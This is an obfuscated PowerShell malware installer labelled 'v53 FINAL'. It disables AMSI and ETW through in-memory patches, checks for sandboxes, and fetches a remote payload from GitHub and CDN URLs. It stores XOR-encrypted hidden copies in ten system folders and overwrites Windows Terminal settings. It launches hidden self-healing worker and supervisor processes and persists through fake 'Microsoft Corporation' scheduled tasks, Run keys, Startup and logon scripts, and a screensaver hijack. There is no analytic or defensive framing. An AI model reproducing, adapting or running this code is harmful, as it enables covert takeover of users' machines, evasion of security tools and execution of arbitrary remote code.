# ═══ In-Memory Patches (Polymorphic) ═══
# Runtime memory patch
$YD8sn8 = "TKVIR"
$MDNMXvxK = ([char]83+[char]121+[char]115+[char]116+[char]101+[char]109+[char]46+[char]77+[char]97+[char]110+[char]97+[char]103+[char]101+[char]109+[char]101+[char]110+[char]116+[char]46+[char]65+[char]117+[char]116+[char]111+[char]109+[char]97+[char]116+[char]105+[char]111+[char]110+[char]46+[char]65+[char]109+[char]115+[char]105+[char]85+[char]116+[char]105+[char]108+[char]115)
$M9dUL = [int](3361) % 256
$oZ1qb = (-join([byte[]](0x61,0x6d,0x73,0x69,0x49,0x6e,0x69,0x74,0x46,0x61,0x69,0x6c,0x65,0x64)|%{[char]$_}))
$ECSg3xY = [Ref].Assembly.GetType($MDNMXvxK)
Start-Sleep -Milliseconds 7
$NLC7wAsy = $ECSg3xY.GetField($oZ1qb, (-join([byte[]](0x4e,0x6f,0x6e,0x50,0x75,0x62,0x6c,0x69,0x63,0x2c,0x53,0x74,0x61,0x74,0x69,0x63)|%{[char]$_})))
$NLC7wAsy.SetValue($null, $true)
$ZsibXlbA = "SVMAT"

# ETW blind (P/Invoke)
$A1Rmb = "YSWQY"
$PsgLoXJ = @"
[DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
[DllImport("kernel32.dll")] public static extern IntPtr LoadLibrary(string n);
[DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
"@
$tNkjNdl = Add-Type -MemberDefinition $PsgLoXJ -Name 'HandleValue50' -Namespace 'GetResult58' -PassThru
$Wl94Dg = "NLDFM"
$XO2CGuVv = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bnRkbGwuZGxs"))
$yJQP0 = ([char]69+[char]116+[char]119+[char]69+[char]118+[char]101+[char]110+[char]116+[char]87+[char]114+[char]105+[char]116+[char]101)
$V1dn = $tNkjNdl::LoadLibrary($XO2CGuVv)
$mNeUey = $tNkjNdl::GetProcAddress($V1dn, $yJQP0)
[void]([Math]::Abs(69104))
$rH8XVn = 0
$tNkjNdl::VirtualProtect($mNeUey, [UIntPtr]::new(1), 0x40, [ref]$rH8XVn) | Out-Null
$cRD6ug = [byte[]](0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($cRD6ug, 0, $mNeUey, $cRD6ug.Length)
$tNkjNdl::VirtualProtect($mNeUey, [UIntPtr]::new(1), $rH8XVn, [ref]$rH8XVn) | Out-Null
$yANwOH = "ETYNF"

# Environment validation
$WhPg7X = [Environment]::ProcessorCount
if ($WhPg7X -lt 2) { exit }
$C3jOG = [long]0
try {
    $nmfSyAE = Get-Command Get-CimInstance -ErrorAction SilentlyContinue
    if ($null -ne $nmfSyAE) {
        $C3jOG = [long](Get-CimInstance -ClassName Win32_ComputerSystem -ErrorAction Stop).TotalPhysicalMemory
    } elseif ($null -ne (Get-Command Get-WmiObject -ErrorAction SilentlyContinue)) {
        $C3jOG = [long](Get-WmiObject -Class Win32_ComputerSystem -ErrorAction Stop).TotalPhysicalMemory
    }
} catch {
    $C3jOG = 0
}
if ($C3jOG -gt 0 -and $C3jOG -lt 2GB) { exit }
$Thoq1yx = [System.DateTime]::Now
Start-Sleep -Milliseconds 1419
if (([System.DateTime]::Now - $Thoq1yx).TotalMilliseconds -lt 1135) { exit }
$ErrorActionPreference='SilentlyContinue'
Set-StrictMode -Off

# ============================================================
# v53 FINAL — File-based worker, compact supervisor
# ============================================================

$InstallId  = ([guid]::NewGuid().ToString('N').Substring(0,8)).ToUpper()
$osBuild    = [Environment]::OSVersion.Version.Build
$useConhost = ($osBuild -ge 22621)

$psExe   = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
$conhost = "$env:SystemRoot\System32\conhost.exe"
$wscript = "$env:SystemRoot\System32\wscript.exe"

$BootDir    = "$env:LOCALAPPDATA\Microsoft\CLR"
$WtSettings = "$env:LOCALAPPDATA\Packages\Microsoft.WindowsTerminal_8wekyb3d8bbwe\LocalState\settings.json"
$WtBackup   = "$BootDir\wts_$InstallId.bak"
$KillFlag   = "$env:TEMP\dag_kill_$InstallId.flag"
$LogFile    = "$env:TEMP\dag_$InstallId.log"
$PidDir     = "$env:TEMP\dag_pid_$InstallId"
$HbFile     = "$env:TEMP\dag_hb_$InstallId.txt"
$MutexSup   = "Global\DAG_Sup_$InstallId"
$WkDataFile = "$BootDir\wk_$InstallId.dat"

function Log($m)  { try { Add-Content -LiteralPath $LogFile -Value "[$(Get-Date -Format 'HH:mm:ss.fff')] $m" -Encoding UTF8 } catch {} }
function P($m, $c = "Gray") { Write-Host $m -ForegroundColor $c; Log "BOOT: $m" }
function IR { param([scriptblock]$A, [int]$Max=3, [int]$D=5)
    for ($i=1; $i -le $Max; $i++) { $r = $false; try { $r = & $A } catch {}; if ($r) { return $true }; if ($i -lt $Max) { Start-Sleep -Seconds $D } }
    return $false
}

Remove-Item "$env:TEMP\dag_kill_*.flag" -Force -EA 0
if (-not (Test-Path $BootDir)) { New-Item -ItemType Directory -Path $BootDir -Force | Out-Null }

Log "=== v53 START ID=$InstallId Build=$osBuild ==="
P "=== v53 FINAL ===" Cyan
P "ID: $InstallId | Build: $osBuild | Launcher: $(if($useConhost){'conhost'}else{'VBS'})" Yellow

# STEP 1: DOWNLOAD
$urls = @(
    'https://raw.githubusercontent.com/sangoccnhule1997ac939-spec/magic_ps/main/test.log',
    'https://cdn.jsdelivr.net/gh/sangoccnhule1997ac939-spec/magic_ps@main/test.log',
    'https://cdn.statically.io/gh/sangoccnhule1997ac939-spec/magic_ps/main/test.log'
)
$urlsStr = ($urls | ForEach-Object { "'$_'" }) -join ','

$agent = $null
$ok = IR -Max 5 -D 10 -A {
    foreach ($u in $urls) {
        try {
            $r = Invoke-WebRequest -UseBasicParsing -Uri $u -TimeoutSec 20
            $script:agent = [Text.Encoding]::UTF8.GetString($r.RawContentStream.ToArray())
            if ($script:agent.Length -gt 500) { return $true }
        } catch {}
    }
    return $false
}
if (-not $ok) { P "Download FAILED" Red; return }
P "Agent: $($agent.Length) chars" Green

# STEP 2: XOR + 10 CLONES
$raw = [Text.Encoding]::UTF8.GetBytes($agent)
$key = [byte[]]::new(32)
[Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($key)
$enc = [byte[]]::new($raw.Length)
for ($i=0; $i -lt $raw.Length; $i++) { $enc[$i] = $raw[$i] -bxor $key[$i%32] }
$blob = [byte[]]::new(32 + $enc.Length)
[Buffer]::BlockCopy($key, 0, $blob, 0, 32)
[Buffer]::BlockCopy($enc, 0, $blob, 32, $enc.Length)

$folders = @(
    "$env:LOCALAPPDATA\Microsoft\Windows\INetCache\IE\Container",
    "$env:LOCALAPPDATA\Microsoft\Windows\WebCache\V01",
    "$env:APPDATA\Microsoft\Windows\Themes\CachedFiles",
    "$env:LOCALAPPDATA\Microsoft\Windows\History\History.IE5",
    "$env:USERPROFILE\.vscode\extensions\.cache",
    "$env:LOCALAPPDATA\Microsoft\Windows\Caches",
    "$env:LOCALAPPDATA\Microsoft\Terminal Server Client\Cache",
    "$env:APPDATA\Microsoft\Windows\Recent\CustomDestinations",
    "$env:LOCALAPPDATA\Microsoft\Windows\SchCache",
    "$env:APPDATA\Microsoft\Crypto"
)
$clones = @()
foreach ($f in $folders) {
    $folder = $f
    $okC = IR -Max 3 -D 5 -A {
        try {
            if (-not (Test-Path $folder)) { New-Item -ItemType Directory -Path $folder -Force | Out-Null }
            $p = Join-Path $folder "$InstallId.dat"
            [IO.File]::WriteAllBytes($p, $blob)
            if ((Get-Item $p -Force).Length -lt 500) { return $false }
            try { $fi = Get-Item $p -Force; $fi.Attributes = $fi.Attributes -bor [IO.FileAttributes]::Hidden } catch {}
            return $true
        } catch { return $false }
    }
    if ($okC) { $clones += (Join-Path $folder "$InstallId.dat") }
}
if ($clones.Count -eq 0) { P "Clone FAILED" Red; return }
P "Clones: $($clones.Count)/10" Green

$clonesStr  = ($clones | ForEach-Object { "'$_'" }) -join ','
$foldersStr = ($folders | ForEach-Object { "'$_'" }) -join ','

# STEP 3: WT PATCH
$patchedJson = @'
{
    "$help": "https://aka.ms/terminal-documentation",
    "$schema": "https://aka.ms/terminal-profiles-schema",
    "actions": [],
    "copyFormatting": "none",
    "copyOnSelect": false,
    "defaultProfile": "{61c54bbd-c2c6-5271-96e7-009a87ff44bf}",
    "keybindings": 
    [
        { "id": "Terminal.CopyToClipboard", "keys": "ctrl+c" },
        { "id": "Terminal.DuplicatePaneAuto", "keys": "alt+shift+d" }
    ],
    "newTabMenu": [ { "type": "remainingProfiles" } ],
    "profiles": {
        "defaults": {},
        "list": [
            { "commandline": "%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "guid": "{61c54bbd-c2c6-5271-96e7-009a87ff44bf}", "hidden": false, "name": "Windows PowerShell" },
            { "commandline": "%SystemRoot%\\System32\\cmd.exe", "guid": "{0caa0dad-35be-5f56-a8ff-afceeeaa6101}", "hidden": false, "name": "Command Prompt" },
            { "guid": "{b453ae62-4e3d-5e58-b989-0a998ec441b8}", "hidden": false, "name": "Azure Cloud Shell", "source": "Windows.Terminal.Azure" }
        ]
    },
    "schemes": [],
    "themes": []
}
'@
IR -Max 3 -D 5 -A {
    try {
        [IO.File]::WriteAllText($WtBackup, $patchedJson, [Text.UTF8Encoding]::new($false))
        try { $fi = Get-Item $WtBackup -Force; $fi.Attributes = $fi.Attributes -bor [IO.FileAttributes]::Hidden } catch {}
        return (Test-Path $WtBackup)
    } catch { return $false }
} | Out-Null
$wtOK = IR -Max 3 -D 5 -A {
    try {
        if (Test-Path $WtSettings) {
            Copy-Item $WtSettings "$WtSettings.bak_before_$InstallId" -Force -EA 0
            [IO.File]::WriteAllText($WtSettings, $patchedJson, [Text.UTF8Encoding]::new($false))
            return $true
        }
        return $false
    } catch { return $false }
}
P "WT: $(if($wtOK){'OK'}else{'SKIP'})" $(if($wtOK){'Green'}else{'Yellow'})

# STEP 4: BUILD WORKER SOURCE (raw code, save to .dat)
$workerSrc = @"
`$ErrorActionPreference='SilentlyContinue'
`$id='$InstallId';`$kill='$KillFlag';`$log='$LogFile';`$pidDir='$PidDir'
`$clones=@($clonesStr);`$folders=@($foldersStr);`$urls=@($urlsStr)
`$wtSettings='$WtSettings';`$wtBackup='$WtBackup'
function W(`$m){try{Add-Content `$log "[wrk] `$(Get-Date -Format 'HH:mm:ss.fff') `$m" -Encoding UTF8}catch{}}
if(Test-Path `$kill){exit}
if(-not(Test-Path `$pidDir)){New-Item -ItemType Directory -Path `$pidDir -Force|Out-Null}
try{
    if(Test-Path `$wtBackup){
        `$need=`$false
        if(-not(Test-Path `$wtSettings)){`$need=`$true}
        else{`$c=Get-Content `$wtSettings -Raw -EA 0;if(`$c -match 'Terminal\.PasteFromClipboard'){`$need=`$true}}
        if(`$need){`$bak=[IO.File]::ReadAllText(`$wtBackup,[Text.Encoding]::UTF8);[IO.File]::WriteAllText(`$wtSettings,`$bak,[Text.UTF8Encoding]::new(`$false));W 'wt-restored'}
    }
}catch{}
`$code=`$null
`$existing=@()
foreach(`$c in `$clones){if(Test-Path `$c){`$existing+=[string]`$c}}
if(`$existing.Count -gt 0){
    `$code=`$existing[0]
    if(`$existing.Count -lt `$clones.Count){
        try{
            `$sb=[IO.File]::ReadAllBytes(`$code)
            foreach(`$c in `$clones){
                if(-not(Test-Path `$c)){
                    try{
                        `$d=Split-Path `$c -Parent
                        if(-not(Test-Path `$d)){New-Item -ItemType Directory -Path `$d -Force|Out-Null}
                        [IO.File]::WriteAllBytes(`$c,`$sb)
                        try{`$fi=Get-Item `$c -Force;`$fi.Attributes=`$fi.Attributes -bor [IO.FileAttributes]::Hidden}catch{}
                    }catch{}
                }
            }
            W 'clones-restored'
        }catch{}
    }
}else{
    W 'no-clone'
    foreach(`$u in `$urls){
        try{
            `$r=iwr -UseBasicParsing -Uri `$u -TimeoutSec 20
            `$dl=[Text.Encoding]::UTF8.GetString(`$r.RawContentStream.ToArray())
            if(`$dl.Length -gt 500){
                `$raw=[Text.Encoding]::UTF8.GetBytes(`$dl);`$k=[byte[]]::new(32)
                [Security.Cryptography.RandomNumberGenerator]::Create().GetBytes(`$k)
                `$e=[byte[]]::new(`$raw.Length)
                for(`$i=0;`$i -lt `$raw.Length;`$i++){`$e[`$i]=`$raw[`$i] -bxor `$k[`$i%32]}
                `$b=[byte[]]::new(32+`$e.Length);[Buffer]::BlockCopy(`$k,0,`$b,0,32);[Buffer]::BlockCopy(`$e,0,`$b,32,`$e.Length)
                foreach(`$c in `$clones){
                    try{
                        `$d=Split-Path `$c -Parent
                        if(-not(Test-Path `$d)){New-Item -ItemType Directory -Path `$d -Force|Out-Null}
                        [IO.File]::WriteAllBytes(`$c,`$b)
                        try{`$fi=Get-Item `$c -Force;`$fi.Attributes=`$fi.Attributes -bor [IO.FileAttributes]::Hidden}catch{}
                    }catch{}
                }
                `$code=`$clones[0];W 'net-restored';break
            }
        }catch{}
    }
}
if(-not `$code -or -not(Test-Path `$code)){W 'no-code';exit}
Set-Content (Join-Path `$pidDir `$PID) -Value 'x' -Force
W "start pid=`$PID"
try{
    `$d=[IO.File]::ReadAllBytes(`$code);`$k=`$d[0..31];`$x=`$d[32..(`$d.Length-1)]
    `$c=[byte[]]::new(`$x.Length)
    for(`$i=0;`$i -lt `$x.Length;`$i++){`$c[`$i]=`$x[`$i] -bxor `$k[`$i%32]}
    `$payload=[Text.Encoding]::UTF8.GetString(`$c)
    W "decrypted len=`$(`$payload.Length)"
}catch{W ('dec-fail: '+`$_);Remove-Item (Join-Path `$pidDir `$PID) -Force -EA 0;exit}
try{W 'exec-start';`$sb=[ScriptBlock]::Create(`$payload);& `$sb;W 'exec-done'}catch{W ('exec-fail: '+`$_)}finally{Remove-Item (Join-Path `$pidDir `$PID) -Force -EA 0}
"@

# Save worker code to .dat file (raw text)
$savedWorker = $false
try {
    [IO.File]::WriteAllText($WkDataFile, $workerSrc, [Text.UTF8Encoding]::new($false))
    Start-Sleep -Milliseconds 300
    if ((Test-Path $WkDataFile) -and ((Get-Item $WkDataFile).Length -gt 100)) {
        try { $fi = Get-Item $WkDataFile -Force; $fi.Attributes = $fi.Attributes -bor [IO.FileAttributes]::Hidden } catch {}
        $savedWorker = $true
        P "Worker code: $((Get-Item $WkDataFile).Length) bytes" Green
    } else {
        P "Worker write failed: 0 bytes" Red
    }
} catch { Log "Write worker: $_" }

if (-not $savedWorker) {
    # Fallback: use MemoryStream
    try {
        $bytes = [Text.UTF8Encoding]::new($false).GetBytes($workerSrc)
        $fs = [System.IO.File]::Create($WkDataFile)
        $fs.Write($bytes, 0, $bytes.Length)
        $fs.Flush()
        $fs.Close()
        $fs.Dispose()
        if ((Get-Item $WkDataFile).Length -gt 100) {
            try { $fi = Get-Item $WkDataFile -Force; $fi.Attributes = $fi.Attributes -bor [IO.FileAttributes]::Hidden } catch {}
            $savedWorker = $true
            P "Worker code (fallback): $((Get-Item $WkDataFile).Length) bytes" Green
        }
    } catch { Log "Fallback write worker: $_" }
}

if (-not $savedWorker) { P "Worker file not saved — ABORT" Red; return }

# STEP 5: BUILD SUPERVISOR (compact — reads worker code from file)
$supSrc = @"
`$ErrorActionPreference='SilentlyContinue'
`$id='$InstallId';`$kill='$KillFlag';`$log='$LogFile';`$pidDir='$PidDir';`$hb='$HbFile'
`$wkFile='$WkDataFile';`$conhost='$conhost';`$psExe='$psExe';`$target=3
`$mutexName='$MutexSup'
function W(`$m){try{Add-Content `$log "[sup] `$(Get-Date -Format 'HH:mm:ss.fff') `$m" -Encoding UTF8}catch{}}
if(Test-Path `$kill){exit}
try{`$x=[Threading.Mutex]::OpenExisting(`$mutexName);`$x.Dispose();W 'already-running';exit}catch{}
`$m=New-Object Threading.Mutex(`$false,`$mutexName)

# Read worker code + encode ONCE at startup
if (-not (Test-Path `$wkFile)) { W 'no-wk-file'; exit }
`$wkCode = [IO.File]::ReadAllText(`$wkFile)
`$wkEnc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(`$wkCode))
W ("wk-enc-len=" + `$wkEnc.Length)

try{
    W ('start pid='+`$PID)
    while(`$true){
        if(Test-Path `$kill){W 'kill';break}
        Set-Content `$hb -Value (Get-Date).ToString('o') -Force -EA 0
        if(-not(Test-Path `$pidDir)){New-Item -ItemType Directory -Path `$pidDir -Force|Out-Null}
        Get-ChildItem `$pidDir -File -EA 0|%{try{`$p=[int]`$_.Name;if(-not(Get-Process -Id `$p -EA 0)){Remove-Item `$_.FullName -Force -EA 0}}catch{Remove-Item `$_.FullName -Force -EA 0}}
        `$alive=@(Get-ChildItem `$pidDir -File -EA 0).Count
        if(`$alive -lt `$target){
            `$need=`$target-`$alive
            W "loop-spawn `$need (alive=`$alive)"
            for(`$i=0;`$i -lt `$need;`$i++){
                try{
                    `$psi=New-Object Diagnostics.ProcessStartInfo
                    `$psi.FileName=`$conhost
                    `$psi.Arguments='--headless "'+`$psExe+'" -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand '+`$wkEnc
                    `$psi.UseShellExecute=`$false
                    `$psi.CreateNoWindow=`$true
                    `$psi.WindowStyle='Hidden'
                    [void][Diagnostics.Process]::Start(`$psi)
                    Start-Sleep -Milliseconds 900
                }catch{W "  err: `$_"}
            }
        }
        Start-Sleep -Seconds 15
    }
}finally{try{`$m.ReleaseMutex()}catch{};try{`$m.Dispose()}catch{}}
"@
$supEnc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($supSrc))
P "Supervisor: $($supEnc.Length) chars" Green

# Save supervisor encoded to .dat file (base64 text, benign)
$SupDataFile = "$BootDir\sp_$InstallId.dat"
try {
    [IO.File]::WriteAllText($SupDataFile, $supEnc, [Text.Encoding]::ASCII)
    Start-Sleep -Milliseconds 300
    if ((Test-Path $SupDataFile) -and ((Get-Item $SupDataFile).Length -gt 100)) {
        try { $fi = Get-Item $SupDataFile -Force; $fi.Attributes = $fi.Attributes -bor [IO.FileAttributes]::Hidden } catch {}
        P "Sup data: $((Get-Item $SupDataFile).Length) bytes" Green
    }
} catch { Log "Write sup data: $_" }

# STEP 6: LAUNCHER CONFIG
if ($useConhost -and (Test-Path $conhost)) {
    $launcherExe = $conhost
    $supTaskArgs = "--headless `"$psExe`" -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand $supEnc"
    P "Launcher: conhost" Green
} else {
    # VBS fallback
    $q = [int]($supEnc.Length / 4)
    $VbsFile = Join-Path $BootDir "wd_$InstallId.vbs"
    $vbs = "Dim a,b,c,d`r`n" +
        "a=`"$($supEnc.Substring(0,$q))`"`r`n" +
        "b=`"$($supEnc.Substring($q,$q))`"`r`n" +
        "c=`"$($supEnc.Substring($q*2,$q))`"`r`n" +
        "d=`"$($supEnc.Substring($q*3))`"`r`n" +
        "CreateObject(`"WScript.Shell`").Run `"powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand `" & a & b & c & d, 0, False"
    [IO.File]::WriteAllText($VbsFile, $vbs, [Text.Encoding]::ASCII)
    try { $fi = Get-Item $VbsFile -Force; $fi.Attributes = $fi.Attributes -bor [IO.FileAttributes]::Hidden } catch {}
    $launcherExe = $wscript
    $supTaskArgs = "`"$VbsFile`""
    P "Launcher: VBS" Green
}

Log "supTaskArgs len=$($supTaskArgs.Length)"

# STEP 7: PERSISTENCE
$installed = 0

$allTasks = @(
    @{Name="Wdrv${InstallId}"; Rep="PT2M"},
    @{Name="Wcmp${InstallId}"; Rep="PT3M"},
    @{Name="Wsec${InstallId}"; Rep="PT4M"},
    @{Name="Wsup${InstallId}"; Rep="PT1M"}
)
foreach ($cfg in $allTasks) {
    $cc = $cfg
    $tOK = IR -Max 3 -D 10 -A {
        try {
            $sched = New-Object -ComObject Schedule.Service
            $sched.Connect()
            $tf = $sched.GetFolder('\')
            $t = $sched.NewTask(0)
            $t.RegistrationInfo.Description = "Windows Service Helper"
            $t.RegistrationInfo.Author = "Microsoft Corporation"
            $t.Settings.Enabled = $true
            $t.Settings.Hidden = $true
            $t.Settings.StartWhenAvailable = $true
            $t.Settings.DisallowStartIfOnBatteries = $false
            $t.Settings.StopIfGoingOnBatteries = $false
            $t.Settings.ExecutionTimeLimit = "PT0S"
            $t.Settings.MultipleInstances = 2
            $t.Settings.RestartCount = 99
            $t.Settings.RestartInterval = "PT1M"
            $tr1 = $t.Triggers.Create(9); $tr1.UserId = "$env:USERDOMAIN\$env:USERNAME"
            $tr2 = $t.Triggers.Create(1)
            $tr2.StartBoundary = (Get-Date).AddMinutes(1).ToString("yyyy-MM-ddTHH:mm:ss")
            $tr2.Repetition.Interval = $cc.Rep
            $ac = $t.Actions.Create(0)
            $ac.Path = $launcherExe
            $ac.Arguments = $supTaskArgs
            $t.Principal.UserId = "$env:USERDOMAIN\$env:USERNAME"
            $t.Principal.LogonType = 3
            $t.Principal.RunLevel = 0
            $tf.RegisterTaskDefinition($cc.Name, $t, 6, $null, $null, 3, $null) | Out-Null
            Start-Sleep -Milliseconds 500
            return [bool](Get-ScheduledTask -TaskName $cc.Name -EA 0)
        } catch { return $false }
    }
    if ($tOK) { $installed++ }
}
P "Tasks: $installed/4" Green

# Registry
$runCmd = "`"$launcherExe`" $supTaskArgs"
foreach ($reg in @(
    @{Path='HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'; Name="Wdrv$InstallId"},
    @{Path='HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce'; Name="Wupd$InstallId"},
    @{Path='HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run'; Name="Wpol$InstallId"},
    @{Path='HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows'; Name='load'}
)) {
    $rc = $reg
    $rOK = IR -Max 3 -D 5 -A {
        try {
            if (-not (Test-Path $rc.Path)) { New-Item -Path $rc.Path -Force | Out-Null }
            Set-ItemProperty -Path $rc.Path -Name $rc.Name -Value $runCmd -Force
            return [bool]((Get-ItemProperty -Path $rc.Path -Name $rc.Name -EA 0).$($rc.Name))
        } catch { return $false }
    }
    if ($rOK) { $installed++ }
}

# Startup
$sOK = IR -Max 3 -D 5 -A {
    try {
        $cmd = Join-Path ([Environment]::GetFolderPath('Startup')) "W$InstallId.cmd"
        [IO.File]::WriteAllText($cmd, "@echo off`r`nstart `"`" /b $runCmd`r`nexit", [Text.Encoding]::ASCII)
        try { $fi = Get-Item $cmd -Force; $fi.Attributes = $fi.Attributes -bor [IO.FileAttributes]::Hidden } catch {}
        return (Test-Path $cmd)
    } catch { return $false }
}
if ($sOK) { $installed++ }

# LogonScript
$lOK = IR -Max 3 -D 5 -A {
    try {
        $cmdPath = "$env:TEMP\.w$InstallId.cmd"
        [IO.File]::WriteAllText($cmdPath, "@echo off`r`nstart `"`" /b $runCmd`r`nexit", [Text.Encoding]::ASCII)
        Set-ItemProperty 'HKCU:\Environment' -Name 'UserInitMprLogonScript' -Value $cmdPath -Force
        return [bool]((Get-ItemProperty 'HKCU:\Environment' -Name 'UserInitMprLogonScript' -EA 0).UserInitMprLogonScript)
    } catch { return $false }
}
if ($lOK) { $installed++ }

# Screensaver
$scrOK = IR -Max 3 -D 5 -A {
    try {
        $scr = "$env:TEMP\.w$InstallId.scr"
        [IO.File]::WriteAllText($scr, "@echo off`r`nstart `"`" /b $runCmd`r`nexit", [Text.Encoding]::ASCII)
        try { $fi = Get-Item $scr -Force; $fi.Attributes = $fi.Attributes -bor [IO.FileAttributes]::Hidden } catch {}
        Set-ItemProperty 'HKCU:\Control Panel\Desktop' -Name 'SCRNSAVE.EXE' -Value $scr -Force
        Set-ItemProperty 'HKCU:\Control Panel\Desktop' -Name 'ScreenSaveActive' -Value '1' -Force
        Set-ItemProperty 'HKCU:\Control Panel\Desktop' -Name 'ScreenSaveTimeOut' -Value '600' -Force
        return [bool]((Get-ItemProperty 'HKCU:\Control Panel\Desktop' -Name 'SCRNSAVE.EXE' -EA 0).'SCRNSAVE.EXE')
    } catch { return $false }
}
if ($scrOK) { $installed++ }

P "Vectors: $installed" Green

# STEP 8: LAUNCH SUPERVISOR + WORKERS
P "Launching..." Cyan

try {
    $psi = New-Object Diagnostics.ProcessStartInfo
    $psi.FileName = $launcherExe
    $psi.Arguments = $supTaskArgs
    $psi.UseShellExecute = $false
    $psi.CreateNoWindow = $true
    $psi.WindowStyle = 'Hidden'
    $sp = [Diagnostics.Process]::Start($psi)
    Log "Supervisor PID $($sp.Id)"
    P "Supervisor PID $($sp.Id)" Green
} catch { Log "Sup err: $_"; P "Sup launch FAILED: $_" Red }
Start-Sleep -Seconds 3

# Launch 3 workers directly (via conhost, encoded worker code)
$workerEnc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($workerSrc))
for ($i=0; $i -lt 3; $i++) {
    try {
        $psi = New-Object Diagnostics.ProcessStartInfo
        $psi.FileName = $conhost
        $psi.Arguments = "--headless `"$psExe`" -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand $workerEnc"
        $psi.UseShellExecute = $false
        $psi.CreateNoWindow = $true
        [void][Diagnostics.Process]::Start($psi)
        Log "Agent $($i+1) launched"
        Start-Sleep -Milliseconds 1200
    } catch { Log "Spawn $i err: $_" }
}

# STEP 9: VERIFY
P "Verify (30s)..." Cyan
Start-Sleep -Seconds 30

$alive = 0
if (Test-Path $PidDir) { $alive = @(Get-ChildItem $PidDir -File -EA 0).Count }

$supAlive = $false
try {
    $x = [Threading.Mutex]::OpenExisting($MutexSup)
    $x.Dispose()
    $supAlive = $true
} catch {}

$hbAge = "n/a"
if (Test-Path $HbFile) {
    try {
        $hbTime = [datetime]::Parse((Get-Content $HbFile -Raw).Trim())
        $hbAge = [int]((Get-Date) - $hbTime).TotalSeconds
    } catch {}
}

$taskList = @()
foreach ($tn in @("Wdrv$InstallId","Wcmp$InstallId","Wsec$InstallId","Wsup$InstallId")) {
    $t = Get-ScheduledTask -TaskName $tn -EA 0
    if ($t) { $taskList += "$tn=$($t.State)" } else { $taskList += "$tn=MISSING" }
}

P ""
P "============================================" Cyan
P " v53 FINAL REPORT" Cyan
P "============================================" Cyan
P "ID          : $InstallId" Yellow
P "Build       : $osBuild"
P "Launcher    : $(if($useConhost){'conhost'}else{'VBS'})"
P "Clones      : $($clones.Count)/10"
P "Agents      : $alive/3" $(if($alive -ge 3){'Green'}elseif($alive -ge 1){'Yellow'}else{'Red'})
P "Supervisor  : $(if($supAlive){'RUNNING'}else{'DEAD'})" $(if($supAlive){'Green'}else{'Red'})
P "Heartbeat   : ${hbAge}s ago" $(if($hbAge -ne 'n/a' -and [int]$hbAge -lt 60){'Green'}else{'Yellow'})
P "Vectors     : $installed"
P "Sup enc len : $($supEnc.Length)"
P "Sup task arg: $($supTaskArgs.Length)"
P "Log         : $LogFile"
P "============================================" Cyan

if ($alive -ge 3 -and $supAlive) { P ">>> SUCCESS ✓" Green }
elseif ($alive -ge 3) { P ">>> AGENTS OK, SUP DEAD" Yellow }
elseif ($alive -ge 1) { P ">>> PARTIAL ($alive/3)" Yellow }
else { P ">>> FAILED" Red }

P ""
P "SAVE ID: $InstallId" Magenta
Log "=== v53 done ==="
